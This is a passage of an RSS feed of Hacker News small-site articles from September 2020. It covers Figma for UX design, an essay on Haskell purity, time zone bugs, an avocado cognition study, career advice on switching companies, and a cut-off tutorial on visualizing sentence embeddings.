<div><p>In 2018, Figma launched the Figma Platform to improve design workflows by connecting Figma to other tools. The web API lays the foundation for unique forms of design collaborations, allowing companies to build customs tools to meet their specific requirements. Amongst companies that have utilized this platform are Uber, Haiku, and Github. For example, to raise visibility across the organization, Uber had created a live feed of what their design team is working on.</p><p>Figma‚Äôs API also promises to fulfill customer requests for third-party plugins. These integrations are web-based and do not need any scripting language for implementation. </p></div>
<h3>4. Prototyping and interactions</h3>
<div><p>The <em>ease </em><em>of </em><em>prototyping</em> is one of the main reasons why Figma is every designer‚Äôs delight. Prototypes are simulations designed to understand the relationship between the final product interfaces and see how effective they are and how they work.</p><p>Figma‚Äôs prototype tools allow designers to create interactive flows on designs seamlessly. Figma also lets interactions on states such as hover, mouse events, and click. The prototypes and all interactions within them can be distributed to anyone with access (just like other design files) to view and provide feedback.</p><p><strong>Prototypes are a fantastic way to:</strong></p></div>
<ul>
<li>Preview interactions and user flows</li>
<li>Share and iterate on ideas</li>
<li>Get feedback from collaborators</li>
<li>Test user interactions</li>
<li>Present your designs to stakeholders</li>
</ul>
<h3>5. Collaborations</h3>
<div><p>One of the Figma‚Äôs strongest suits is it‚Äôs <em>real-time updating and collaborating</em> feature amongst designers, developers, and even clients. It is no wonder Figma has been called the <em>Google Docs of </em><em>D</em><em>esign</em>. Sharing options are available at different levels on the design ‚Äì project level, team level, and file level. Each project-level also comes with a different set of rights. For example, only the designers can edit individual elements, while everyone else is free to review them.</p><p>Everyone viewing or editing a design has his/her avatar at the top of the page. It is easy to track other collaborators‚Äô movements and actions, as their mouse cursor carries their name as a label.&nbsp; You can click on someone else‚Äôs avatar to see what they view or work on in real-time.</p><p>Figma tops this great feature by integrating Slack for live communication amongst collaborators. When a Figma slack channel is active, any comment, feedback, or design edits is immediately reflected on the communication channel. Changes are reviewed and vetted immediately.</p><p>The collab feature also comes in handy during remote presentations, as everyone who has access to the file can follow the viewport of the presenter, as everything they refer to can be checked right on the spot.</p></div>
<h2>The cons‚ÄØof Figma</h2>
<p>Although Figma packs many positive values, it still carries some downsides. One is that you have to be always online to enjoy its numerous benefits. The desktop app offers offline work mode, where your files sync once you get back within internet range. It provides no backup in case of a system crash or unexpected incident, and you can only work on files already uploaded to the cloud. The offline mode poses some limitations on some of the valuable features.</p>
<p>Figma also offers little privacy as team members can see each other‚Äôs work. Someone could even be spying on you while you do some work on the shared files. If you are a designer/developer who prefers to work within their customized privacy, get ready to abandon that factor when using Figma.</p>
<h2>Conclusion</h2>
<p>Figma is an intuitive and innovative tool with the intent to take on the entire design process. It offers enormous benefits to both individuals and teams. Figma‚Äôs ingenuity shows in its utilization of accessibility to the web while delivering the same features expected of a native app. It offers enough flexibility to iterate and produce deliverables. It also generates its own CSS code on elements that developers can later use to build on top of that. <em><strong>The benefits of using Figma for user experience design outweigh the cons.</strong></em></p>
</div></div>]]>
            </description>
            <link>https://codecoda.com/en/blog/entry/using-figma-for-user-experience-design</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587183</guid>
            <pubDate>Fri, 25 Sep 2020 06:45:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Vedanta]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24587159">thread link</a>) | @johndoe42377
<br/>
September 24, 2020 | https://karma-engineering.com/lab/wiki/Haskell/Vedanta | <a href="https://web.archive.org/web/*/https://karma-engineering.com/lab/wiki/Haskell/Vedanta">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">
<p>
A program is precise specification of a process, detailed-enough to be executed by an abstract machine.
</p>
<p>
An algorithm is a formalized (well-defined and precise) general procedure (a sequence of actions to perform), to be implemented in all sufficient and necessary details.
</p>
<h2 id="Haskell">Haskell</h2>
<p>
Haskell is pure Logic. Strongly-typed with type-classes and highly syntactically sugared, which is compiled to a intermediate language (MIR) which is also a language based on a <em>Simply-Typed Lambda Calculus</em>, which, in turn, is <em>evaluated by runtime as a type-checked state machine</em> - this is what the function <code>main</code> produces (which is what a Haskell executable really is).
</p>
<p>
Not just that, all Haskell code, including MIR, could be evaluated by pure substitution -- by applying rewrite rules, (beta-reduction, inlining, etc.) exactly like Logic and Math, which, look at this:
</p>
<p>
<em>makes Haskell a pure high-order predicate logic, statically typed with type-classes, reducible to pure Lambda Calculus (as its implementation)</em>.
</p>
<p>
C++ is a joke compared to this and NodeJS is just bullshit.
</p>
<h2 id="Purity">Purity</h2>
<p>
All Haskell expressions are pure, even when they describe impure actions to be performed eventually by mundane impure runtime.
</p>
<p>
The expression produced by the main function is a pure definition of a state-machine (an actual structure!) verified to be type-safe (have no contradictions) by the compiler.
</p>
<p>
Each function is pure because the <em>context</em> (or state) is always passed to it as a parameter, even <em>The Whole World</em> is passed in the case of IO (implementation, however, throws it away!).
</p>
<p>
From the mathematical point of view if you have the whole world as a parameter to a function which returns a value <em>together with a new version of the world, after causing some effect on it</em>, then, the function is indeed pure. <em>Same input - same output. Always</em>.
</p>
<p>
This is not a joke. Not just a beautiful metaphor. As long as all functions are pure <em>the substitution model of evaluation (as in Lambda Calculus, Logic and Mathematics) still holds</em>, so Haskell is still a pure higher-order logic - <em>Simply Typed Lambda Calculus extended with some additional evaluation rules, type-classes and decorated with some syntactic sugar</em>. Its MIT is exactly this.
</p>
<p>
One more time: Haskell code is <em>a Pure Logic</em>, not just theoretically but technically and operationally.
</p>
<p>
It all can, in principle, be evaluated with pen and pencil using substitution. Just like Maths.
</p>
<h2 id="Monads">Monads</h2>
<p>
Haskell literally separates a pure functional code from impure by  creating <em>an abstraction barrier</em> between pure and impure code by encapsulation such code into various <a href="https://karma-engineering.com/lab/wiki/Haskell/Monads">Monads</a>.
</p>
<p>
Separation (an abstraction barrier) is enforced at a type level.
Functions below cannot access values (and functions) above.
</p>
<p>
The <em>contexts</em> could play very different roles, from holding algebraic data types, such as <code>Either</code> or <code>Maybe</code>, to encapsulations <code>State</code> and <code>IO</code>.
</p>
<p>
Being composed (which is what it is all about) Monads provide an implicit sequencing for a pure, lazy code, via <a href="https://karma-engineering.com/lab/wiki/FirstPrinciples/Nesting">nesting</a> of functions -- <code>(.)</code> and <code>(&gt;&gt;=)</code> are merely nested lambdas.
</p>
<p>
Thus, Monads are fit to encapsulate <code>IO</code> actions which imply serialization (sequencing).
</p>
<p>
End of the long and messy story.
</p>
<h2 id="Endofknowledge.">End of knowledge.</h2>
<p>
Technically, Haskell is a pure-functional language with lazy semantics  which is statically (and, obviously, strongly) typed with type-classes. It is simplified into an intermediate language (representation), which is just <em>Simple-Typed Lambda Calculus extended with a few additional types, syntactic forms and evaluation rules</em>. Even more technically, it uses <em>System F Omega formalism</em> to implement High-order Logic.
</p>
</div></div>]]>
            </description>
            <link>https://karma-engineering.com/lab/wiki/Haskell/Vedanta</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587159</guid>
            <pubDate>Fri, 25 Sep 2020 06:41:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Error Found in RAND's Random Digit Book]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24587002">thread link</a>) | @galeos
<br/>
September 24, 2020 | http://xn--AMillionRandomDigitsWasaNumber-CrunchersBible-7y71a6bt.NowOneHasExposedFlawsintheDisorder.https://www.wsj.com/articles/rand-million-random-digits-numbers-book-error-11600893049 | <a href="https://web.archive.org/web/*/http://xn--AMillionRandomDigitsWasaNumber-CrunchersBible-7y71a6bt.NowOneHasExposedFlawsintheDisorder.https://www.wsj.com/articles/rand-million-random-digits-numbers-book-error-11600893049">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://xn--AMillionRandomDigitsWasaNumber-CrunchersBible-7y71a6bt.NowOneHasExposedFlawsintheDisorder.https://www.wsj.com/articles/rand-million-random-digits-numbers-book-error-11600893049</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587002</guid>
            <pubDate>Fri, 25 Sep 2020 06:04:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time Zone Bugs I Ran Into]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 64 (<a href="https://news.ycombinator.com/item?id=24586991">thread link</a>) | @Sandeepg33k
<br/>
September 24, 2020 | https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into | <a href="https://web.archive.org/web/*/https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1600871234687/et6yX6Wlb.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Software development is hard. Time zones are hard. Dealing with time zones in software development?  Yeah, <strong>harder</strong>.</p>
<p>Here are <strong>4</strong> places where time zones might differ; and 4 personal bug stories for each case. I'll be referring to the same app for each story, the one I work with and maintain in my day-to-day job. This app works with Mexico's City time zone.</p>

<h2 id="time-zone-of-your-app">Time zone of your app</h2>
<p>Your app runs with a default time zone. It's usually the time zone of the server it runs on, but it can be different.</p>
<p>In Java, you can define the time zone of the whole application when it boots. If for some reason you don't want to work with your server's timezone, this is the place to change it.</p>
<h3 id="the-bug-time-in-chile-off-by-one-hour">The bug - Time in Chile off by one hour</h3>
<p>The app shows the date of creation of an object in many places. Three of these places were showing different times; <strong>two incorrect and one correct</strong>.</p>
<p>One error was because I forgot to pass the user's timezone to the date formatter. Quick fix.</p>
<p>The second error was weird. I couldn't identify why, so I compared it with the correct one.</p>
<p>But the third case was only right because the date had been double parsed! Once on the server and a second time on the client (browser).</p>
<p>So none of the three dates were actually correct. <strong>WTF?</strong></p>
<p>After some headaches, I learned that each version of Java comes with a time zone data file. This file includes the latest information on the world's time zones, and the <a target="_blank" href="https://www.iana.org/time-zones">Internet Assigned Numbers Authority (IANA)</a> manages it. </p>
<p>Time zone changes happen when governments decide to apply or not to apply daylight saving times (DST). </p>
<p>In 2015, Chile decided to move from seasonal DST to permanent DST, and some JRE releases included this change. But then, in 2016 Chile decided to revert to how it was before; seasonal DST instead of permanent. <strong>What was the issue?</strong> The app was using one of these JRE releases with an outdated time zone data file.</p>
<p>You can read more about these <a target="_blank" href="https://hi.service-now.com/kb_view.do?sysparm_article=KB0622033">DST issues with Java here</a>.</p>

<h2 id="time-zone-of-your-server">Time zone of your server</h2>
<p>The operative system defines your server's time zone. I've always used Linux for production servers, and they come with UTC as the default time zone.</p>
<p>If you need to change this time zone, make sure to do it before your application starts or it won't reflect the change.</p>
<h3 id="the-bug-app-using-the-wrong-default-time-zone-from-the-server">The bug - App using the wrong default time zone from the server</h3>
<p>I was migrating some processes in our build and deployment pipeline. From configuring the app with every deploy to a pre-built AWS Amazon Machine Image (AMI) with HashiCorp's Packer.</p>
<p>One step of the initial configuration was to change the server's time zone to America/Mexico_City, and I was aware of it. So I created a bash script that changed the time zone on the AMI we were going to use. The script worked well when I tested it on a Linux instance. No problem there.</p>
<p>I proceeded to use this AMI in our staging environment and neither I nor my teammates noticed something off. So, to production!</p>
<p>Customer's questions and complaints about dates behaving weird arrived minutes later üò•</p>
<p><strong>The issue?</strong> The script that updated the server's time zone was failing silently and I missed double-checking it in the staging environment. The app wasn't using an explicit time zone, so it took the server's. And the server's time zone was UTC by default, and we needed America/Mexico_City. I fixed the script and, to make sure, updated the app's default time zone to the expected one.</p>

<h2 id="time-zone-of-your-database">Time zone of your database</h2>
<p>You can also change your database's time zone. I use AWS Relational Database Service (RDS) and the default time zone is UTC. You can update it from the parameter group of your cluster or individual instance.</p>
<h3 id="the-bug-wrong-database-time-zone">The bug - Wrong database time zone</h3>
<p>Now I was doing a migration of our database. I anticipated myself by changing the database's time zone to America/Mexico_City because the app and server had it. Every part of the system should be in the same page, right? <strong>Wrong!</strong></p>
<p>The database was perfectly okay being in UTC while the app and server were in America/Mexico_City. That's how it worked. </p>
<p>This bug was not as critical as the previous ones because I caught it in our staging environment. </p>

<h2 id="time-zone-of-your-users">Time zone of your users</h2>
<p>If it wasn't enough, each one of your users can have a different time zone, and you have to take that into consideration when showing time sensitive-data.</p>
<h3 id="the-bug-many-of-them">The bug - Many of them!</h3>
<p>I've encountered many bugs related to user's time zones:</p>
<ul>
<li>Missing time zone in date formatter.</li>
<li>Incorrect time zone selection from the user.</li>
<li>Missing DST time zone options for users to select.</li>
<li>Storing dates with time zone modifications that get parsed again when retrieved.</li>
</ul>
<hr>
<p>Time zones are one of the most complicated topics you'll find while developing software. They're complex by themselves, and even more when you throw some code into the mix.</p>
<p>I hope these short stories can help you avoid my mistakes in the future üôåüèº</p>
<p><strong>Thanks for reading me! üíô</strong></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586991</guid>
            <pubDate>Fri, 25 Sep 2020 06:01:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Avocado a Day Keeps the Neurologist Away]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586974">thread link</a>) | @whereistimbo
<br/>
September 24, 2020 | https://legacyneuro.com/avocado-day-keeps-neurologist-away/ | <a href="https://web.archive.org/web/*/https://legacyneuro.com/avocado-day-keeps-neurologist-away/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                                                <article id="post-2389">
                                <p><time datetime="2017-08-25T07:20:23-05:00">Aug                                        <strong>25</strong></time>
                                    
                                </p>
                                <div>
                                    

                                    <div>
                                        <div>
<h4>Tufts University has released results of a study linking eating avocados to helping improve cognitive brain function</h4>
<p>The study reveals an link to ‚Äúeating avocados to helping improve cognitive brain function in older adults, news especially relevant to Hispanics who have been found to have the longest life expectancy rate in the U.S. Published in the journal Nutrients and supported by the USDA and the Hass Avocado Board, the research tracked how 40 healthy adults ages 50 and over who ate one fresh avocado a day for six months experienced a 25 percent increase in lutein levels in their eyes and significantly improved working memory and problem-solving skills.</p>

<p>Lutein is a type of carotenoid antioxidant, or pigment, commonly found in fruits and vegetables already widely accepted to have a role in preserving eye health and now increasingly thought to have a positive impact on brain health as well. As study participants incorporated one medium avocado into their daily diet, researchers monitored gradual growth in the amount of lutein in their eyes and progressive improvement in cognition skills as measured by tests designed to evaluate memory, processing speed and attention levels. In contrast, the control group, which did not eat avocados, experienced fewer improvements in cognitive health during the study period.</p>
<p>‚ÄúThe results of this study suggest that the monounsaturated fats, fiber, lutein and other bioactives make avocados particularly effective at enriching neural lutein levels, which may provide benefits for not only eye health, but for brain health,‚Äù said Elizabeth Johnson, lead investigator of the study from the Jean Mayer USDA Human Nutrition Research Center on Aging at Tufts University. ‚ÄúFurthermore, the results of this new research reveal that macular pigment density more than doubled in subjects that consumed fresh avocados, compared to a supplement, as evidenced by my previous published research. Thus, a balanced diet that includes fresh avocados may be an effective strategy for cognitive health.‚Äù</p>
<p>‚ÄúTuft‚Äôs findings that eating avocados is linked to a positive impact on memory is one more reason to enjoy healthy avocados daily. It‚Äôs especially good news for Hispanic households where avocados are already so popular and older generations are culturally central to the core family unit,‚Äù said Emiliano Escobedo, executive director of the Hass Avocado Board. ‚ÄúMore research is needed in different populations with different amounts of avocado to better understand the connection between avocados and brain health.‚Äù</p>
</div>

<p>&nbsp;‚ÄúAn Avocado a Day Keeps the Neurologist Away.‚Äù&nbsp;<i>The Produce News ‚Äì Covering Fresh Produce around the Globe since 1897.</i>&nbsp;The Produce News, 24 Aug. 2017. Web. 25 Aug. 2017.</p>

<p>The article can be found <a href="http://producenews.com/category-list/22124-an-avocado-a-day-keeps-the-neurologist-away">here</a></p>
                                    </div>

                                    
                                </div>
                            </article>
                                        </div>

                

            </div></div>]]>
            </description>
            <link>https://legacyneuro.com/avocado-day-keeps-neurologist-away/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586974</guid>
            <pubDate>Fri, 25 Sep 2020 05:59:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Covert Acoustical Mesh Networks in Air (2013)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586794">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | http://www.jocm.us/index.php?m=content&c=index&a=show&catid=124&id=600 | <a href="https://web.archive.org/web/*/http://www.jocm.us/index.php?m=content&c=index&a=show&catid=124&id=600">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                          <div>
                          <div>
                          <p><img src="http://www.jocm.us/statics/images//images/p.jpg" alt=""></p>                          <!--<div class="about-more"><a href="#"><i class="fa fa-hand-o-right"></i><span style="font-size:14px;">Online First
</span></a></div>-->
                          </div>
<div>
<p>Journal of Communications&nbsp;</p><p>
Welcome to the website of the Journal of Communications. JCM is a scholarly peer-reviewed international scientific journal published monthly, focusing on theories, systems, methods, algorithms and applications in communications. It provide a high profile, leading edge forum for academic researchers, industrial professionals, engineers, consultants, managers, educators and policy makers working in the field to contribute and disseminate innovative new work on communications.&nbsp;All papers will be blind reviewed and accepted papers will be published monthly which is available online (<a href="http://www.jocm.us/index.php?m=content&amp;c=index&amp;a=lists&amp;catid=99">open access</a>) and in printed version.</p><!--<div class="about-more" style="float:right; margin-right:10px;"><a href="http://www.ijmerr.com/list-9-1.html"><i class="fa fa-question-circle-o"></i><span style="font-size:14px;">All Issues
</span></a></div>-->
</div>

                        </div>
                     </div></div>]]>
            </description>
            <link>http://www.jocm.us/index.php?m=content&amp;c=index&amp;a=show&amp;catid=124&amp;id=600</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586794</guid>
            <pubDate>Fri, 25 Sep 2020 05:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciding to Switch Companies]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586217">thread link</a>) | @rustoo
<br/>
September 24, 2020 | https://staffeng.com/guides/deciding-to-switch | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/deciding-to-switch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/deciding-to-switch">Deciding to switch companies</a></h4><div><p>My father was a professor of economics. After he completed his PhD in his late twenties, he started teaching at one university, got tenure at that university, and walked out forty-some years later into retirement. Working in technology, that sounds like a fairytale.</p>
<p>There are very few software companies with a forty-year track record, and even fewer folks whose <a href="https://lethain.com/forty-year-career/">forty-year career</a> consisted of one employer. There used to be a meme that many engineers spent either one or four years at each company to maximize their equity grants and then bounced on to the next. If that ever happened, it certainly isn‚Äôt common behavior for folks who aspire towards or reach Staff-plus roles.</p>
<p>Instead, generally those folks stay, and are rewarded for staying, at a given company as long as the circumstances support their success. If those circumstances change, they tend to either leave shortly thereafter or spend a while burning out and then leave after exhausting their emotional reservoir.</p>
<p>It takes years to build the visibility and social credibility to get promoted from a Senior Engineer role to a Staff-plus role, which makes it very difficult to walk away if you feel like you‚Äôre <em>just</em> one hump away from the promotion. Leaving, it can feel like, means starting over from scratch.</p>
<p>Then again, as described by <a href="https://staffeng.com/stories/duretti-hirpa">Duretti Hirpa</a> and <a href="https://staffeng.com/stories/keavy-mcminn">Keavy McMinn</a>, it‚Äôs common for folks to attain their first Staff-plus title by joining a new company. Even with all your internal credibility, sometimes leaving is the most effective path forward.</p>
<p>What‚Äôs the right decision for you?</p>
<hr>
<p>Before going further, I want to recognize two very different job-switching experiences: one of privileged flexibility and another of rigid constraints. Your residency might depend on a work-sponsored visa. You might be supporting an extended family. You might be constrained to a geographical area with few employers. This advice focuses on the former circumstances, which are more common circumstances for someone who‚Äôs deep enough into a technology career to pursue a Staff role. You should absolutely discount it to the extent this doesn‚Äôt reflect your circumstances.</p>
<h2>Why leaving works</h2>
<p>The company that knows your strengths the best is your current company, and they are the company most likely to give you a Staff-plus role. However, actually awarding the role depends on so many circumstantial concerns, that this isn‚Äôt how it works out in practice.</p>
<p>If your current team is very senior, it may be hard to justify your impact at the Staff engineer level because it‚Äôs being attributed to your peers. Your manager might have a limited budget that doesn‚Äôt have room for another Staff engineer. You might lack an internal sponsor. There simply might not be the need for an additional Staff engineer at your company. Any of these can mean that while you ought to be promoted, your current company won‚Äôt.</p>
<p>Conversely, when you interview for new roles, you can simply keep interviewing until you find a company that‚Äôs able to grant the title. The interview process often brings an automatic sponsor with it -- the hiring manager -- whose incentives will never be more aligned with yours than in the interview process.</p>
<p>The technical interviews are an inconsistent and unreliable predictor of success, which is bad for the industry and bad for companies, but works in your favor if you‚Äôre set on attaining a Staff-plus role and are willing to conduct a broad search. Interviewing creates the opportunity to play ‚Äúbias arbitrage‚Äù, finding a company that values your particular brand of bullshit disproportionately. That might be a company that values folks with conference speaking visibility, your experience designing APIs, or <a href="https://staffeng.com/stories/dmitry-petrashko">your PhD thesis on compilers</a>.</p>
<p>Similarly, sometimes you‚Äôll get into a rut at a company where your reputation is preventing forward progress. Perhaps you‚Äôve tagged ‚Äúdifficult‚Äù after flagging inclusion issues. Maybe you embarrassed an influential Director at lunch and they‚Äôre blocking your promotion. A new company lets you leave that baggage behind.</p>
<hr>
<p>Yeah, of course, it‚Äôs always an open question whether you can <em>really</em> leave anything behind you in the tech industry. It can feel a bit cliquey at times. If you‚Äôve worked in tech hubs, at larger companies, and for more than ten years, then you almost certainly have mutual connections with the folks interviewing you.</p>
<p>If you have a bad run at a company, maybe your manager was a bully or maybe you were going through a challenging period in your own life, it can feel like a cloud poisoning your future prospects. That said, much like the interview process in general, references and backchannel reference checks are deeply random. If you need any further evidence of that, look to the serial harassers who continue to get hired job after job at prominent companies.</p>
<h2>Things to try before leaving</h2>
<p>If you‚Äôre planning to leave due to lack of interest, excitement, support or opportunity, it‚Äôs worthwhile to at least explore the internal waters first. This lets you carry your internal network with you while still getting many of the advantages of switching companies. Depending on your company‚Äôs size and growth rate this might not be an option for you, but there are some folks who switch roles every two-to-three years within the same parent company, and find that an effective way to remain engaged and learning.</p>
<p>On the other hand, if you‚Äôre considering leaving due to burnout or exhaustion, it‚Äôs sometimes possible to negotiate a paid or unpaid sabbatical where you can take a few months recharging yourself, often in conjunction with switching internal roles. This is more common at larger companies. (In case you were wondering, no your coworkers taking parental leave is not ‚Äúon sabbatical‚Äù or ‚Äúon vacation.‚Äù)</p>
<h2>Leaving without a job</h2>
<p>Speaking of burnout, if you‚Äôre <em>particularly</em> burned out, it‚Äôs worth considering leaving your job without another job lined up. There‚Äôs a fairly simple checklist to determine if this is a good option for you:</p>
<ul>
<li>Does your visa support this?</li>
<li>Are you financially secure for at least a year without working?</li>
<li>Do you work in a high-density job market, remotely, or are you flexible on where your next job is?</li>
<li>Do you interview well?</li>
<li>Could you articulate a coherent narrative to someone asking you why you left without a job lined up?</li>
<li>Are there folks at your previous company who can provide positive references?</li>
</ul>
<p>If all of those are true, then I don‚Äôt know anyone who <em>regrets</em> taking a sabbatical. However, bear in mind that it‚Äôs only the folks who took six-month-plus sabbaticals who felt reborn by the experience. Folks taking shorter stints have appreciated them but often come back only partially restored.</p>
<h2>Taking the plunge</h2>
<p>If you‚Äôre almost at the Staff promotion in your current company, there is absolutely another company out there who will give you the Staff title. Whether or not you‚Äôll enjoy working there or be supported after getting there, that‚Äôs a lot harder to predetermine. If your internal reputation is damaged or if you‚Äôve been repeatedly on the cusp of promotion but victim to a moving criteria line, then you should seriously consider switching roles if the title is important to you -- at some point you have to hear what your current company is telling you.</p>
<p>Conversely, if you‚Äôre happy in your current role outside of the title, consider if you can be more intentional about pursuing your promotion rather than leaving. Many folks hit a rut in their promotion path to Staff-plus, and using techniques like the <a href="https://staffeng.com/guides/promo-packets">promotion packet</a> can help you get unstuck. If you‚Äôve used all the approaches, taken your self-development seriously, and still can‚Äôt get there -- it‚Äôs probably time to change.</p>
<p>That said, it‚Äôs easy to overthink these things. Few folks tell their decade-past story of staying at or leaving some job.</p></div><p><em><a href="https://staffeng.com/guides">Read another guide?</a></em> <!-- -->or<!-- --> <em><a href="https://staffeng.com/stories">Back to the stories?</a></em></p></section></div></div>]]>
            </description>
            <link>https://staffeng.com/guides/deciding-to-switch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586217</guid>
            <pubDate>Fri, 25 Sep 2020 03:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interactive Analysis of Sentence Embeddings]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586043">thread link</a>) | @amitness
<br/>
September 24, 2020 | https://amitness.com/interactive-sentence-embeddings/ | <a href="https://web.archive.org/web/*/https://amitness.com/interactive-sentence-embeddings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p><a href="https://projector.tensorflow.org/">Embedding Projector</a> is a free web application for visualizing high-dimensional data. It has built-in demos for visualizing word embeddings in NLP and image embeddings for MNIST in Computer Vision.</p>
<p>I recently experimented with a way to load sentence embeddings along with the class labels into this tool and explore them interactively. In this blog post, I will explain the end-to-end process with an example dataset.</p>
<h2 id="toy-example-outlier-detection">Toy Example: Outlier Detection</h2>
<h3 id="1-preparing-dataset">1. Preparing Dataset</h3>
<p>To understand this use case, let‚Äôs take a subset of 100 movie reviews from the SST-2 dataset which are labeled as positive and negative.</p>
<div><div><pre><code><span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>'http://bit.ly/dataset-sst2'</span><span>,</span> 
                 <span>nrows</span><span>=</span><span>100</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>,</span> <span>names</span><span>=</span><span>[</span><span>'text'</span><span>,</span> <span>'label'</span><span>])</span>

<span>df</span><span>[</span><span>'label'</span><span>]</span> <span>=</span> <span>df</span><span>[</span><span>'label'</span><span>].</span><span>replace</span><span>({</span><span>0</span><span>:</span> <span>'negative'</span><span>,</span> <span>1</span><span>:</span> <span>'positive'</span><span>})</span>
</code></pre></div></div>
<p>The dataset has a column containing the text and a label indicating whether it‚Äôs positive or negative opinion.</p>
<p><img src="https://amitness.com/images/projector-head-5.png" alt=""></p>
<p>We will introduce label noise into our dataset by corrupting five of the responses with random text. It will act as an outlier for our example.</p>
<div><div><pre><code><span>df</span><span>.</span><span>loc</span><span>[[</span><span>10</span><span>,</span> <span>27</span><span>,</span> <span>54</span><span>,</span> <span>72</span><span>,</span> <span>91</span><span>],</span> <span>'text'</span><span>]</span> <span>=</span> <span>'askgkn askngk kagkasng'</span>
</code></pre></div></div>
<h3 id="2-generating-embeddings">2. Generating Embeddings</h3>
<p>Now, we will compute sentence embeddings for the headlines using the <code>sentence-transformers</code> package. First, let‚Äôs install it using pip.</p>
<div><div><pre><code><span>!</span>pip <span>install </span>sentence-transformers
</code></pre></div></div>
<p>Next, we will create a helper function to return a NumPy array of sentence embeddings given a list of sentences.</p>
<div><div><pre><code><span>from</span> <span>sentence_transformers</span> <span>import</span> <span>SentenceTransformer</span>

<span>sentence_bert_model</span> <span>=</span> <span>SentenceTransformer</span><span>(</span><span>'distilbert-base-nli-stsb-mean-tokens'</span><span>)</span>

<span>def</span> <span>get_embeddings</span><span>(</span><span>sentences</span><span>):</span>
    <span>return</span> <span>sentence_bert_model</span><span>.</span><span>encode</span><span>(</span><span>sentences</span><span>,</span>
                                    <span>batch_size</span><span>=</span><span>32</span><span>,</span> 
                                    <span>show_progress_bar</span><span>=</span><span>True</span><span>)</span>
</code></pre></div></div>
<p>Using the above function, we can generate sentence embeddings for our data as shown below.</p>
<div><div><pre><code><span>e</span> <span>=</span> <span>get_embeddings</span><span>(</span><span>df</span><span>[</span><span>'text'</span><span>])</span>
<span># shape: (100, 768)
</span></code></pre></div></div>
<h3 id="3-exporting-to-embedding-projector-format">3. Exporting to Embedding Projector Format</h3>
<p>Embedding Projector requires two TSV files to load our custom embeddings.</p>
<ul>
<li><code>output.tsv</code>: This file should contain the embeddings without any headers.</li>
<li><code>metadata.tsv</code>: This file should contain the original text and labels for the embeddings</li>
</ul>
<p>Let‚Äôs first generate the <code>output.tsv</code> file for our sentence embeddings from the previous step.</p>
<div><div><pre><code><span># Convert NumPy array of embedding into data frame
</span><span>embedding_df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>e</span><span>)</span>

<span># Save dataframe as as TSV file without any index and header
</span><span>embedding_df</span><span>.</span><span>to_csv</span><span>(</span><span>'output.tsv'</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>,</span> <span>index</span><span>=</span><span>None</span><span>,</span> <span>header</span><span>=</span><span>None</span><span>)</span>
</code></pre></div></div>
<p>To generate <code>metadata.csv</code>, we simply save our original dataframe.</p>
<div><div><pre><code><span># Save dataframe without any index
</span><span>df</span><span>.</span><span>to_csv</span><span>(</span><span>'metadata.tsv'</span><span>,</span> <span>index</span><span>=</span><span>False</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>)</span>
</code></pre></div></div>
<h3 id="4-importing-into-embedding-projector">4. Importing into Embedding Projector</h3>
<p>We first go to <a href="https://projector.tensorflow.org/">https://projector.tensorflow.org/</a>.</p>
<p>On the left-hand sidebar, click the <strong>Load</strong> button.</p>
<p><img src="https://amitness.com/images/projector-load-step-1.png" alt=""></p>
